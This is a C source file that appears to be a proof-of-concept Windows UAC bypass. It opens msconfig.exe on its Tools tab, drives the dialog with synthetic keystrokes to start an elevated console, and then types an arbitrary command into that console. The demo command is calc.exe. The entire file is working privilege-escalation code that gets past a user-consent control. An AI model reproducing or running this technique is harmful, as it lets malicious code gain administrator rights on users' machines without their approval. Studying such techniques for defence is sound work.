#include "pch.h"

BOOL CALLBACK ElevatedConsoleCallback
(
    _In_ HWND   hwnd,
    _In_ LPARAM lParam
)
{
    BOOL Elevated = FALSE;
    DWORD dwPid;
    LPWSTR lpPayload = (LPWSTR)lParam;
    WCHAR szBuffer[0x400];

    if (GetClassNameW(hwnd, (LPWSTR)szBuffer, _countof(szBuffer))) {
        if (!StrCmpW(szBuffer, L"ConsoleWindowClass")) {
            if (GetWindowThreadProcessId(hwnd, &dwPid)) {
                if (NT_SUCCESS(IsProcessElevated(dwPid, &Elevated))) {
                    if (Elevated) {
                        SendKeys(lpPayload);
                        SendControlInput(VK_RETURN, FALSE, FALSE);
                        return TRUE;
                    }
                }
            }
        }
    }

    return FALSE;
}

static BOOL CALLBACK EnumChildCallback
(
    _In_ HWND hwnd,
    _In_ LPARAM lParam
)
{
    UINT i;
    HWND hwndButton, hwndList;

    hwndList = FindWindowExW(hwnd, NULL, L"SysListView32", L"List1");
    if (hwndList) {
        for (i = 0; i < 14; i++) {
            SendControlInput(VK_DOWN, FALSE, FALSE);
        }

        hwndButton = GetDlgItem(hwnd, 302);
        if (hwndButton == NULL) {
			hwndButton = GetDlgItem(hwnd, 1117);
		}

        if (hwndButton) {
            SendControlInput(VK_TAB, FALSE, FALSE);
            SendControlInput(VK_TAB, FALSE, FALSE);

            SendControlInput(VK_RETURN, FALSE, FALSE);
            Sleep(1000);
            ElevatedConsoleCallback(GetForegroundWindow(), lParam);

            return FALSE;
        }
    }

    return TRUE;
}

VOID BypassByPkgmgr
(
	_In_ LPWSTR lpCommandline
)
{
	WCHAR PkgMgrPath[MAX_PATH];
	SHELLEXECUTEINFOW ShellExeInfo;
	PROCESS_BASIC_INFORMATION ProcessInfo;
	ULONG ReturnLength = 0;
	HWND hWnd = NULL;
	NTSTATUS Status = 0;

	ExpandEnvironmentStringsW(L"%WINDIR%\\System32\\msconfig.exe", PkgMgrPath, MAX_PATH);
    SecureZeroMemory(&ShellExeInfo, sizeof(ShellExeInfo));
	ShellExeInfo.cbSize = sizeof(ShellExeInfo);
	ShellExeInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	ShellExeInfo.lpFile = PkgMgrPath;
	ShellExeInfo.lpParameters = L"-5";
	ShellExeInfo.nShow = SW_SHOW;

	if (!ShellExecuteExW(&ShellExeInfo)) {
		goto END;
	}

    SecureZeroMemory(&ProcessInfo, sizeof(ProcessInfo));
	Status = NtQueryInformationProcess(ShellExeInfo.hProcess, ProcessBasicInformation, &ProcessInfo, sizeof(ProcessInfo), &ReturnLength);
	if (!NT_SUCCESS(Status)) {
		goto END;
	}

	Sleep(1000);
	hWnd = GetWindowHandle(ProcessInfo.UniqueProcessId, L"#32770", NULL, NULL);
	if (hWnd == NULL) {
		goto END;
	}

	EnumChildWindows(hWnd, EnumChildCallback, (LPARAM)lpCommandline);
END:
	if (ShellExeInfo.hProcess != NULL) {
		TerminateProcess(ShellExeInfo.hProcess, 0);
	}

	return;
}

int wmain()
{
    BypassByPkgmgr(L"C:\\Windows\\System32\\calc.exe");

    return 0;
}